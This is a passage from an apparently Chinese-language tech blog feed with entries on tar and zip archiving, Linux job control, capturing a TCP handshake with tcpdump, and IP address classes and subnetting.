压缩，文件大小更小，但需要的时间长于-z</p></blockquote><p>​</p><p>通过将 todo.txt 文件添加到存档来更新现有的 tar 文件：</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">tar</span> -rvf archive.tar todo.txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><blockquote><p>选项：r = 添加文件</p></blockquote><p>列出压缩文件里的内容</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">tar</span> -tzvf test.tar.gz<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>​</p><p>解压文件</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">tar</span> -xzvf test.tar.gz<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>​</p><p>列出 tar 文件的内容：</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">tar</span> -tf file.tar<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><blockquote><p>选项：t = display, f = file</p></blockquote><p>创建当前目录的压缩存档，但排除某些目录：</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">tar</span> --exclude<span class="token operator">=</span><span class="token string">'./folder'</span> --exclude<span class="token operator">=</span><span class="token string">'./upload/folder2'</span> -cfzv archive.tar <span class="token keyword">.</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><blockquote><p>排除 “folder” 和 “folder2”</p></blockquote><h2 id="二、zip-和-unzip"><a href="#二、zip-和-unzip" class="headerlink" title="二、zip 和 unzip"></a>二、zip 和 unzip</h2><h3 id="介绍-1"><a href="#介绍-1" class="headerlink" title="介绍"></a>介绍</h3><p>Linux zip 命令用于压缩文件，zip 是个使用广泛的压缩程序，压缩后的文件后缀名为 <strong>.zip</strong>。<br>Linux unzip 命令用于解压缩 zip 文件，unzip 为**.zip**压缩文件的解压缩程序。<br>​</p><h3 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h3><p>基于 Ubuntu 和 Debian 的操作系统发行版</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">sudo</span> <span class="token function">apt-get</span> <span class="token function">install</span> <span class="token function">zip</span> unzip<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>​</p><p>基于 CentOS 和 Fedora 的操作系统发行版</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">sudo</span> yum <span class="token function">install</span> <span class="token function">zip</span> unzip<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>​</p><h3 id="语法格式"><a href="#语法格式" class="headerlink" title="语法格式"></a>语法格式</h3><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">zip</span> <span class="token punctuation">[</span>参数<span class="token punctuation">]</span> <span class="token punctuation">[</span>文件<span class="token punctuation">]</span>unzip <span class="token punctuation">[</span>参数<span class="token punctuation">]</span> <span class="token punctuation">[</span>文件<span class="token punctuation">]</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>​</p><h3 id="常用参数-1"><a href="#常用参数-1" class="headerlink" title="常用参数"></a>常用参数</h3><p>zip 命令</p><table><thead><tr><th><strong>参数</strong></th><th><strong>介绍</strong></th></tr></thead><tbody><tr><td>-q</td><td>不显示指令执行过程</td></tr><tr><td>-r</td><td>递归处理，将指定目录下的所有文件和子目录一并处理</td></tr><tr><td>-z</td><td>替压缩文件加上注释</td></tr><tr><td>-v</td><td>显示指令执行过程或显示版本信息</td></tr><tr><td>-n &lt;字尾字符串&gt;</td><td>不压缩具有特定字尾字符串的文件</td></tr></tbody></table><p>unzip 命令</p><table><thead><tr><th><strong>参数</strong></th><th><strong>介绍</strong></th></tr></thead><tbody><tr><td>-l</td><td>显示压缩文件内所包含的文件</td></tr><tr><td>-v</td><td>执行时显示详细的信息</td></tr><tr><td>-c</td><td>将解压缩的结果显示到屏幕上，并对字符做适当的转换</td></tr><tr><td>-n</td><td>解压缩时不要覆盖原有的文件</td></tr><tr><td>-j</td><td>不处理压缩文件中原有的目录路径</td></tr><tr><td>-d</td><td>解压到指定路径</td></tr></tbody></table><h3 id="zip-示例"><a href="#zip-示例" class="headerlink" title="zip 示例"></a>zip 示例</h3><p>将**/home/html/<strong>这个目录下所有文件和文件夹打包为当前目录下的</strong>html.zip**：</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">zip</span> -q -r html.zip /home/html<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>​</p><p>压缩文件<strong>cp.zip</strong>中删除文件<strong>a.c</strong>：</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">zip</span> -dv cp.zip a.c<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>​</p><p>把<strong>mydata</strong>目录压缩为<strong>mydata.zip</strong>：</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">zip</span> -r mydata.zip mydata<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>​</p><p>把<strong>abc</strong>文件夹和<strong>123.txt</strong>压缩成为<strong>abc123.zip</strong>：</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">zip</span> -r abc123.zip abc 123.txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="unzip-示例"><a href="#unzip-示例" class="headerlink" title="unzip 示例"></a>unzip 示例</h3><p>把<strong>mydata.zip</strong>解压到<strong>mydatabak</strong>目录里面：</p><pre class="line-numbers language-bash"><code class="language-bash">unzip mydata.zip -d mydatabak<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>​</p><p>把 <strong>wwwroot.zip</strong> 直接解压到当前目录：</p><pre class="line-numbers language-bash"><code class="language-bash">unzip wwwroot.zip<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>​</p><p>把当前目录下的<strong>所有 zip 文件</strong>同时解压到当前目录：</p><pre class="line-numbers language-bash"><code class="language-bash">unzip abc\*.zip<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>​</p><p>查看 <strong>wwwroot.zip</strong> 里面的内容：</p><pre class="line-numbers language-bash"><code class="language-bash">unzip -v wwwroot.zip<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>​</p><p>验证 <strong>wwwroot.zip</strong> 是否完整：</p><pre class="line-numbers language-bash"><code class="language-bash">unzip -t wwwroot.zip<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="三、查看压缩文件信息"><a href="#三、查看压缩文件信息" class="headerlink" title="三、查看压缩文件信息"></a>三、查看压缩文件信息</h2><p>使用 <strong>file</strong> 命令查看：</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">file</span> test.tar.gz<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>使用 <strong>zipinfo</strong>查看<strong>zip 文件</strong>信息：</p><pre class="line-numbers language-bash"><code class="language-bash">zipinfo test.zip<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> Linux </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Linux任务的前后台管理</title>
      <link href="/post/8ed3ed3a.html"/>
      <url>/post/8ed3ed3a.html</url>
      
        <content type="html"><![CDATA[<h1 id="Linux-任务的前后台管理"><a href="#Linux-任务的前后台管理" class="headerlink" title="Linux 任务的前后台管理"></a>Linux 任务的前后台管理</h1><h2 id="一、介绍"><a href="#一、介绍" class="headerlink" title="一、介绍"></a>一、介绍</h2><p>Linux 在命令行中启动某个任务有两种方式，一种是前台，一种是后台。 一般来说，对于短时任务，我们以前台方式运行，在这种方式下，任务运行结束后用户会再次回到命令行； 而对于长时任务，一般希望以后台方式运行，这样做的好处是，当用户退出命令行时并不影响任务运行。<br>​</p><h2 id="二、基本命令"><a href="#二、基本命令" class="headerlink" title="二、基本命令"></a>二、基本命令</h2><ol><li>在 Linux 终端运行命令的时候，在命令末尾加上 <strong>&amp;</strong> 符号，就可以让程序在后台运行</li><li>如果程序正在前台运行，可以使用 <strong>Ctrl+z</strong> 选项把程序暂停</li><li>用<strong>jobs -l</strong>查看刚才暂停的程序的 pid(进程号)</li><li>使用 <strong>bg %[pid]</strong> 命令让这个暂停的程序在后台继续运行</li><li><strong>jobs</strong> 命令查看当前终端后台运行的任务，同时也能看</li><li>使用 <strong>kill [pid]</strong> 命令可以终止进程</li></ol><p>​</p><h3 id="让进程在后台运行"><a href="#让进程在后台运行" class="headerlink" title="让进程在后台运行"></a>让进程在后台运行</h3><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">command</span> <span class="token operator">&amp;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="查看后台运行的进程"><a href="#查看后台运行的进程" class="headerlink" title="查看后台运行的进程"></a>查看后台运行的进程</h3><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">jobs</span> -l<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="让后台运行的进程-n-到前台来"><a href="#让后台运行的进程-n-到前台来" class="headerlink" title="让后台运行的进程 n 到前台来"></a>让后台运行的进程 n 到前台来</h3><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">fg</span> %n<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="让进程-n-到后台去"><a href="#让进程-n-到后台去" class="headerlink" title="让进程 n 到后台去"></a>让进程 n 到后台去</h3><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">bg</span> %n<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="结束进程-n"><a href="#结束进程-n" class="headerlink" title="结束进程 n"></a>结束进程 n</h3><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">kill</span> n<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><blockquote><p>PS：”n” 为 jobs 查看到的进程编号</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> Linux </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>tcpdump抓包分析tcp</title>
      <link href="/post/e7ae6b8b.html"/>
      <url>/post/e7ae6b8b.html</url>
      
        <content type="html"><![CDATA[<h1 id="tcpdump-抓包分析-tcp-三次握手四次挥手"><a href="#tcpdump-抓包分析-tcp-三次握手四次挥手" class="headerlink" title="tcpdump 抓包分析 tcp 三次握手四次挥手"></a>tcpdump 抓包分析 tcp 三次握手四次挥手</h1><h2 id="一、tcpdump-简介"><a href="#一、tcpdump-简介" class="headerlink" title="一、tcpdump 简介"></a>一、tcpdump 简介</h2><p>tcpdump 是一个运行在命令行下的数据包分析器。它允许用户拦截和显示发送或收到过网络连接到该计算机的 TCP/IP 和其他数据包。<br>​</p><h2 id="二、tcpdump-使用方法"><a href="#二、tcpdump-使用方法" class="headerlink" title="二、tcpdump 使用方法"></a>二、tcpdump 使用方法</h2><h3 id="1-基本用法"><a href="#1-基本用法" class="headerlink" title="1. 基本用法"></a>1. 基本用法</h3><p>监视指定网络接口的数据包，这是个必需参数</p><pre class="line-numbers language-bash"><code class="language-bash">tcpdump -i ens33<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>​</p><p>监视指定主机的数据包，打印所有进入或离开 <strong>truda</strong> 的数据包</p><pre class="line-numbers language-bash"><code class="language-bash">tcpdump -i ens33 host truda<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>​</p><p>也可以指定 IP，例如截获所有 <strong>192.168.2.10</strong> 的主机收到的和发出的所有的数据包</p><pre class="line-numbers language-bash"><code class="language-bash">tcpdump -i ens33 host 192.168.2.10<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>截获主机<strong>192.168.10.11</strong>和主机<strong>192.168.10.12</strong>或<strong>192.168.10.13</strong>的通信</p><pre class="line-numbers language-bash"><code class="language-bash">tcpdump -i ens33 host 192.168.10.11 and \<span class="token punctuation">(</span>192.168.10.12 or 192.168.10.13 \<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="2-选项"><a href="#2-选项" class="headerlink" title="2. 选项"></a>2. 选项</h3><pre class="line-numbers language-bash"><code class="language-bash">-a：尝试将网络和广播地址转换成名称；-c<span class="token operator">&lt;</span>数据包数目<span class="token operator">></span>：收到指定的数据包数目后，就停止进行倾倒操作；-d：把编译过的数据包编码转换成可阅读的格式，并倾倒到标准输出；-dd：把编译过的数据包编码转换成C语言的格式，并倾倒到标准输出；-ddd：把编译过的数据包编码转换成十进制数字的格式，并倾倒到标准输出；-e：在每列倾倒资料上显示连接层级的文件头；-f：用数字显示网际网络地址；-F<span class="token operator">&lt;</span>表达文件<span class="token operator">></span>：指定内含表达方式的文件；-i<span class="token operator">&lt;</span>网络界面<span class="token operator">></span>：使用指定的网络截面送出数据包；-l：使用标准输出列的缓冲区；-n：不把主机的网络地址转换成名字；-N：不列出域名；-O：不将数据包编码最佳化；-p：不让网络界面进入混杂模式；-q ：快速输出，仅列出少数的传输协议信息；-r<span class="token operator">&lt;</span>数据包文件<span class="token operator">></span>：从指定的文件读取数据包数据；-s<span class="token operator">&lt;</span>数据包大小<span class="token operator">></span>：设置每个数据包的大小；-S：用绝对而非相对数值列出TCP关联数；-t：在每列倾倒资料上不显示时间戳记；-tt： 在每列倾倒资料上显示未经格式化的时间戳记；-T<span class="token operator">&lt;</span>数据包类型<span class="token operator">></span>：强制将表达方式所指定的数据包转译成设置的数据包类型；-v：详细显示指令执行过程；-vv：更详细显示指令执行过程；-x：用十六进制字码列出数据包资料；-w<span class="token operator">&lt;</span>数据包文件<span class="token operator">></span>：把数据包数据写入指定的文件。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="三、TCP-IP-三次握手四次挥手分析"><a href="#三、TCP-IP-三次握手四次挥手分析" class="headerlink" title="三、TCP/IP 三次握手四次挥手分析"></a>三、TCP/IP 三次握手四次挥手分析</h2><h3 id="1-准备"><a href="#1-准备" class="headerlink" title="1. 准备"></a>1. 准备</h3><p>操作系统：CentOS 7<br>网卡：ens33<br>分析目标：与 <a href="http://www.baidu.com/">www.baidu.com</a> 的 TCP/IP 三次握手四次挥手过程<br>分析工具：tcpdump<br>​</p><p>CentOS 安装 tcpdump：</p><pre class="line-numbers language-bash"><code class="language-bash">yum <span class="token function">install</span> tcpdump -y<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="2-抓包操作"><a href="#2-抓包操作" class="headerlink" title="2. 抓包操作"></a>2. 抓包操作</h3><p>通过<strong>ping</strong>操作获取<strong><a href="http://www.baidu.com/">www.baidu.com</a></strong>当前解析的 IP 地址：<strong>14.215.177.39</strong><br><img src="https://cdn.nlark.com/yuque/0/2021/png/519483/1627382453942-86687631-da6b-4525-90f0-63314ba26200.png#clientId=uda748786-7649-4&amp;from=paste&amp;height=205&amp;id=u98ad19bc&amp;margin=%5Bobject%20Object%5D&amp;name=image.png&amp;originHeight=205&amp;originWidth=828&amp;originalType=binary%E2%88%B6=1&amp;size=119819&amp;status=done&amp;style=none&amp;taskId=u58910cf3-fa3b-4958-8785-dd953918692&amp;width=828" alt="image.png"><br>​</p><p>查看本地的 IP 地址<br><img src="https://cdn.nlark.com/yuque/0/2021/png/519483/1627382588769-3b247812-e7bc-4657-a661-93cff30fd0ba.png#clientId=uda748786-7649-4&amp;from=paste&amp;height=251&amp;id=ub1bb1a58&amp;margin=%5Bobject%20Object%5D&amp;name=image.png&amp;originHeight=251&amp;originWidth=860&amp;originalType=binary%E2%88%B6=1&amp;size=112574&amp;status=done&amp;style=none&amp;taskId=u364b22f9-bb08-4232-a783-c5f57fb1124&amp;width=860" alt="image.png"></p><p>使用<strong>tcpdump</strong>监听本地与<strong>14.215.177.39</strong>的通信数据包</p><pre class="line-numbers language-bash"><code class="language-bash">tcpdump -n -i ens33 host 192.168.2.34 and 14.215.177.39 <span class="token operator">>></span> /tmp/tcpdump.txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://cdn.nlark.com/yuque/0/2021/png/519483/1627382811232-4460aa9a-6557-442e-b71e-9ef04e2d1bd4.png#clientId=uda748786-7649-4&amp;from=paste&amp;height=122&amp;id=u1b0fbfca&amp;margin=%5Bobject%20Object%5D&amp;name=image.png&amp;originHeight=122&amp;originWidth=986&amp;originalType=binary%E2%88%B6=1&amp;size=63840&amp;status=done&amp;style=none&amp;taskId=u85cedbae-6498-4400-95b5-13bb8d3e2d9&amp;width=986" alt="image.png"></p><p>使用 <strong>ping</strong> 操作添加干扰<br><img src="https://cdn.nlark.com/yuque/0/2021/png/519483/1627382848192-04fa090d-dc68-4e51-be73-017d07c8b33d.png#clientId=uda748786-7649-4&amp;from=paste&amp;height=177&amp;id=uac959ae2&amp;margin=%5Bobject%20Object%5D&amp;name=image.png&amp;originHeight=177&amp;originWidth=717&amp;originalType=binary%E2%88%B6=1&amp;size=68944&amp;status=done&amp;style=none&amp;taskId=u2d14866d-5180-4d2d-b284-e7cda1ef70c&amp;width=717" alt="image.png"></p><p>使用<strong>curl</strong>访问<strong><a href="http://www.baidu.com/">www.baidu.com</a></strong></p><pre class="line-numbers language-bash"><code class="language-bash">curl http://www.baidu.com/<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://cdn.nlark.com/yuque/0/2021/png/519483/1627382890425-aeeefcf1-e3d9-4095-afc3-776682722950.png#clientId=uda748786-7649-4&amp;from=paste&amp;height=154&amp;id=u9c8acbd9&amp;margin=%5Bobject%20Object%5D&amp;name=image.png&amp;originHeight=154&amp;originWidth=707&amp;originalType=binary%E2%88%B6=1&amp;size=64156&amp;status=done&amp;style=none&amp;taskId=u7b873f1f-3ed6-45d4-b407-7b6b16c9eb4&amp;width=707" alt="image.png"></p><h3 id="3-分析"><a href="#3-分析" class="headerlink" title="3. 分析"></a>3. 分析</h3><p>查看捕获的数据包内容</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">cat</span> /tmp/tcpdump.txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>三次握手 🤝 过程<br><img src="https://cdn.nlark.com/yuque/0/2021/png/519483/1627383567174-6b2d626a-fe2e-40cd-959d-e8676587e5e9.png#clientId=uda748786-7649-4&amp;from=paste&amp;height=192&amp;id=u11156e50&amp;margin=%5Bobject%20Object%5D&amp;name=image.png&amp;originHeight=192&amp;originWidth=1137&amp;originalType=binary%E2%88%B6=1&amp;size=153793&amp;status=done&amp;style=none&amp;taskId=u80ff2e20-bbc8-48d4-a38f-6e407743327&amp;width=1137" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2021/png/519483/1627384329215-bfe607fd-6ea8-42b4-8e30-42e58863708a.png#clientId=uda748786-7649-4&amp;from=drop&amp;id=ub48278e8&amp;margin=%5Bobject%20Object%5D&amp;name=%E5%AE%9E%E8%AE%AD%E4%BA%8C%20%282%29.png&amp;originHeight=588&amp;originWidth=768&amp;originalType=binary%E2%88%B6=1&amp;size=44986&amp;status=done&amp;style=none&amp;taskId=u5a670ce9-fb0f-42db-9dbd-d0fe346fd9a" alt="实训二 (2).png"><br>​</p><p>四次挥手 👋 过程<br><img src="https://cdn.nlark.com/yuque/0/2021/png/519483/1627383530640-4b74b5d8-d7ae-4714-8504-1a721a313af0.png#clientId=uda748786-7649-4&amp;from=paste&amp;height=177&amp;id=u48c45c1e&amp;margin=%5Bobject%20Object%5D&amp;name=image.png&amp;originHeight=177&amp;originWidth=1138&amp;originalType=binary%E2%88%B6=1&amp;size=147658&amp;status=done&amp;style=none&amp;taskId=u5f28f3ac-3ac3-4a14-88f5-61eea81f91f&amp;width=1138" alt="image.png"></p>]]></content>
      
      
      <categories>
          
          <category> 网络 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 网络 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>IP分类与子网划分</title>
      <link href="/post/c70bad6f.html"/>
      <url>/post/c70bad6f.html</url>
      
        <content type="html"><![CDATA[<h1 id="IP-分类与子网划分"><a href="#IP-分类与子网划分" class="headerlink" title="IP 分类与子网划分"></a>IP 分类与子网划分</h1><h2 id="一、前言"><a href="#一、前言" class="headerlink" title="一、前言"></a>一、前言</h2><p>整个因特网就是一个单一的、抽象的的网络。IP 地址就是给因特网上的每一个主机（或路由器）的每一个接口分配一个在全世界范围是唯一的 32 位的标识符。IP 地址的结构使我们可以在因特网上很方便的进行寻址。其中 IP 的编制方法共经过了三个历史阶段：分类的 IP 地址 -&gt; 子网的划分 -&gt; 构成超网。</p><h2 id="二、2-进制与-10-进制的转换"><a href="#二、2-进制与-10-进制的转换" class="headerlink" title="二、2 进制与 10 进制的转换"></a>二、2 进制与 10 进制的转换</h2><h3 id="1-二进制转换为-10-进制"><a href="#1-二进制转换为-10-进制" class="headerlink" title="1. 二进制转换为 10 进制"></a>1. 二进制转换为 10 进制</h3><p><img src="https://cdn.nlark.com/yuque/0/2021/png/519483/1627309374661-2f1c362a-df13-4d16-99dd-b8ea18867199.png#clientId=u9b6318d2-268a-4&amp;from=paste&amp;id=udf94e93c&amp;margin=%5Bobject%20Object%5D&amp;name=image.png&amp;originHeight=596&amp;originWidth=878&amp;originalType=url%E2%88%B6=1&amp;size=132326&amp;status=done&amp;style=none&amp;taskId=ue1c670ec-5729-44ed-a231-830a0de2a51" alt="image.png"></p><h3 id="2-十进制转换为二进制"><a href="#2-十进制转换为二进制" class="headerlink" title="2. 十进制转换为二进制"></a>2. 十进制转换为二进制</h3><p><img src="https://cdn.nlark.com/yuque/0/2021/png/519483/1627309414685-848d331a-acb7-499d-b395-b9f62c5ca306.png#clientId=u9b6318d2-268a-4&amp;from=paste&amp;id=u22488183&amp;margin=%5Bobject%20Object%5D&amp;name=image.png&amp;originHeight=512&amp;originWidth=824&amp;originalType=url%E2%88%B6=1&amp;size=182155&amp;status=done&amp;style=none&amp;taskId=ue24d9ed1-1633-41e8-86be-01506d9fb48" alt="image.png"></p><h2 id="三、IP-地址的组成"><a href="#三、IP-地址的组成" class="headerlink" title="三、IP 地址的组成"></a>三、IP 地址的组成</h2><p>IP 地址是一串数字，遵循国际编写规范，共由 32 位二进制数字 0/1 组成(关于二进制请参考：一文看懂计算机数据：从每位数永不大于 9 到二进制 0-1)，每 8 位为一组，用圆点隔开。类似身份号码的数据段(6 位表示籍贯+8 位表示出生年月+3 位表示顺序码+1 位校验码)，IP 地址数据分为两个功能段：<br>网络地址/网络号+主机地址/主机号(共 32 位)，共分为如下五大类，其中 A/B/C 类为常用 IP 地址：</p><ul><li>A 类 IP 地址：8 位网络地址 + 24 位主机地址</li><li>B 类 IP 地址：16 位网络地址 + 16 位主机地址</li><li>C 类 IP 地址：24 位网络地址 + 8 位主机地址</li><li>D 类 IP 地址为组播地址</li><li>E 类 IP 地址为保留地址</li></ul><p><img src="https://cdn.nlark.com/yuque/0/2021/jpeg/519483/1627309650496-e848f718-fd68-485b-ab07-637eab2155b2.jpeg#clientId=u9b6318d2-268a-4&amp;from=paste&amp;id=ue244ca0c&amp;margin=%5Bobject%20Object%5D&amp;originHeight=782&amp;originWidth=640&amp;originalType=url%E2%88%B6=1&amp;status=done&amp;style=none&amp;taskId=u1cef3a3c-38da-40d9-9060-c29278a9608"><br>分为 A、B、C 这三类之后，就可以更好的去分配这 42 亿的 IP 地址了</p><ul><li>A 类地址的网络号为 8 位，且首位是<strong>0</strong></li><li>B 类地址的网络号为 16 位，并且前两位是<strong>10</strong></li><li>C 地址的网络号为 24 位，并且前三位是<strong>110</strong></li></ul><p>知道了每一类的 IP 地址网络号和主机号的位数，就可以计算出最小网络号、最大网络号以及最小主机号和最大主机号。但是这里边有一些<strong>特殊的主机号</strong>是需要排除的</p><h3 id="特殊的主机号"><a href="#特殊的主机号" class="headerlink" title="特殊的主机号"></a>特殊的主机号</h3><ul><li><strong>主机号全是 0</strong>，表示当前的网络段，不可分配为特定主机（如：1.0.0.0）</li><li><strong>主机号全是 1</strong>，表示广播地址，向当前网络段所有主机发消息，也不可以分配给特定的主机（如：1.255.255.255）</li></ul><h3 id="特殊的网络号"><a href="#特殊的网络号" class="headerlink" title="特殊的网络号"></a>特殊的网络号</h3><ul><li>A 类地址网络段全为 0(0000000)表示特殊网络，这个网络段是不能直接使用的</li><li>A 类地址网络段后 7 位全为 1(01111111)表示<strong>回环地址</strong>，不能直接使用</li><li>B 类地址网络段全为 0(10000000.0000000:128.0)是不可使用的</li><li>C 类地址网络段全为 0(192.0.0)是不可使用的</li></ul><p>​</p><p>知道了特殊主机号和特殊网络号之后，就可以对上边的表进行更加准确的描述<br><img src="https://cdn.nlark.com/yuque/0/2021/png/519483/1627310063870-92b48c34-999d-485e-a564-2510ce64456f.png#clientId=u9b6318d2-268a-4&amp;from=drop&amp;id=u2b7c6726&amp;margin=%5Bobject%20Object%5D&amp;name=2211318603-3fdbc10d8cb80d81_fix732.png&amp;originHeight=153&amp;originWidth=732&amp;originalType=binary%E2%88%B6=1&amp;size=71649&amp;status=done&amp;style=none&amp;taskId=ufb22ecbe-14b1-43b4-a8d6-52b4b3289c2" alt="2211318603-3fdbc10d8cb80d81_fix732.png"><br>通过这个就可以简单的进行判断一个 IP 地址是哪一类的地址了</p><pre class="line-numbers language-bash"><code class="language-bash">125.125.3.60 转化为2进制是  01111101  因为首位是0，所以是A类IP地址163.70.31.23 转化为2进制是  10100011  前两位是10，所以是B类IP地址210.36.127.11 转化为2进制是 11010010  前三位是110，所以是C类IP地址<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="回环地址"><a href="#回环地址" class="headerlink" title="回环地址"></a>回环地址</h3><p>127.0.0.1，通常被称为<strong>本地回环地址</strong>（Loopback Address），不属于任何一个有类别的地址。它代表设备的本地虚拟接口，所以默认被看做是永远不会宕掉的接口。在 Windows 操作系统中也有相似的定义，所以通常在安装网卡前就可以 ping 通这个本地回环地址。一般都会用来检查本地网络协议、基本数据接口等是否正常<br>下边其实还有两个分类的 IP 地址，D 类和 E 类，因为他们一般是特殊使用的，所以不做具体了解<br><img src="https://cdn.nlark.com/yuque/0/2021/png/519483/1627310131636-812a42ad-0d75-4e8a-96cb-63ff7d55593d.png#clientId=u9b6318d2-268a-4&amp;from=drop&amp;id=u5d0c6dec&amp;margin=%5Bobject%20Object%5D&amp;name=4288250708-8cd234faa71d3b56_fix732.png&amp;originHeight=185&amp;originWidth=732&amp;originalType=binary%E2%88%B6=1&amp;size=20583&amp;status=done&amp;style=none&amp;taskId=ue1c1c932-a731-4262-8d65-a737a06e2e5" alt="4288250708-8cd234faa71d3b56_fix732.png"></p><h2 id="四、子网划分"><a href="#四、子网划分" class="headerlink" title="四、子网划分"></a>四、子网划分</h2><p>在前边介绍到，一个 IP 由网络号和主机号两个部分组成。在子网划分这块，会将一个 IP 分成三个部分，分别是网络号、子网号、主机号<br><img src="https://cdn.nlark.com/yuque/0/2021/png/519483/1627310243610-d263c546-d221-4778-acf1-c2e40bc74da6.png#clientId=u9b6318d2-268a-4&amp;from=drop&amp;id=ud8f2b3c8&amp;margin=%5Bobject%20Object%5D&amp;name=4288250708-8cd234faa71d3b56_fix732%20%281%29.png&amp;originHeight=185&amp;originWidth=732&amp;originalType=binary%E2%88%B6=1&amp;size=20583&amp;status=done&amp;style=none&amp;taskId=u7bffbf43-725d-47a5-887e-1e08ae102f8" alt="4288250708-8cd234faa71d3b56_fix732 (1).png"></p><h3 id="子网号是如何进行工作的"><a href="#子网号是如何进行工作的" class="headerlink" title="子网号是如何进行工作的"></a>子网号是如何进行工作的</h3><p>假设在上边的例子中，分配了 C 类地址 193.10.10.0，对于这个 C 类地址有 254 个主机号。如果对这个 C 类地址进行子网划分的话，就可以把<strong>第 25 位</strong>看做是子网号(11000001.00001010.00001010.<strong>0</strong>0000000)，那么就可以分成 1 和 0 这两个子网号。那么 0 这个子网号就可以表示：193.10.10.0 ~ 193.10.10.127 这个网络段。1 这个子网就可以表示：193.10.10.128 ~ 193.10.10.255 这个网络段，这样就把原来的 C 类地址分成了两个子网<br><img src="https://cdn.nlark.com/yuque/0/2021/png/519483/1627310270602-9438caa7-eb22-42ca-99ae-e39a9f8e52b6.png#clientId=u9b6318d2-268a-4&amp;from=drop&amp;id=u5f2d199c&amp;margin=%5Bobject%20Object%5D&amp;name=2388936454-e71ba4b853cbcb08_fix732.png&amp;originHeight=153&amp;originWidth=732&amp;originalType=binary%E2%88%B6=1&amp;size=34771&amp;status=done&amp;style=none&amp;taskId=u1c2d4b06-2821-4028-a6ed-9b1e1fee810" alt="2388936454-e71ba4b853cbcb08_fix732.png"><br>如果 A、B、C 类的地址都进行很多的子网划分的话，将会导致有非常多的子网，那么此时如何快速的判断某一个 IP 是属于哪一个网络号的？这个时候就提出了一个新的概念：<strong>子网掩码</strong></p><h4 id="子网掩码"><a href="#子网掩码" class="headerlink" title="子网掩码"></a>子网掩码</h4><ul><li>子网掩码和 IP 地址一样，都是 32 位</li><li>子网掩码由<strong>连续</strong>的 0 和连续的 1 组成的</li><li>某一个子网的子网掩码，具有<strong>网络号位数个连续的 1</strong></li></ul><p>比如，对于 A 类地址，它的网络号有 8 位，主机号 24 位，那么对于 A 类地址，它的子网掩码就是由 8 个 1 和 24 个 0 所组成，也就是<strong>255.0.0.0</strong>。同理，B 类地址的子网掩码就是由 16 个 1 和 16 个 0 所组成，也就是<strong>255.255.0.0</strong><br><img 